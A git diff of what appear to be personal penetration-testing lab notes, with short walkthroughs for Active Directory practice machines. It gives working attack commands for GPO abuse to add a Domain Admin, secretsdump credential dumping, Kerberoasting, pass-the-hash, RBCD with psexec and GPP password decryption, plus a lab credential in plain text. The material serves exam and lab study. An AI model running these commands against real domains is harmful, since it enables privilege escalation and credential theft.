@@ -8,6 +8,15 @@
 6. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 192.168.131.97 -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:Game2On4.!'` 
 7. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!@192.168.131.97'` 
 
+==== 
+
+#### Access => Kerberoasting, SeManageVolumePrivilege 
+1. Use Get-SPNs.ps1 then `Add-Type -AssemblyName System.IdentityModel` then `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'` to store token in memory 
+2. Run Invoke-Kerberoast.ps1 to grab the hash then `Invoke-RunasCs -Username {{USERNAME}} -Password {{PASSWORD}} -Command "whoami"` (Invoke-RunasCs needs importing) 
+
+#### Heist 
+1. 
+2. 
 
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
@@ -18,6 +27,7 @@
 6. `export KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache` 
 7. `impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 
 
+==== 
 
 #### Active => GPP in xml 
 SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ` 
